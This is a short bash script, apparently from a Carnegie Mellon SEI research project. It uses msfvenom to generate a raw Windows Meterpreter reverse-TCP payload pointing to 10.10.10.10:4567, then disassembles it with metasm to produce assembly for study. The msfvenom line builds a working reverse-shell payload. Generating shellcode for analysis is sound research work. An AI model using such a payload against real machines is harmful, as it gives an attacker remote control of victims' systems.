#!/bin/bash

# Copyright 2022 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

export RUBYLIB=/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasm-1.0.4/

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4567 -f raw > raw_binary

sudo chmod +x /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasm-1.0.4/samples/disassemble.rb
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasm-1.0.4/samples/disassemble.rb --no-data raw_binary > asm_code.asm
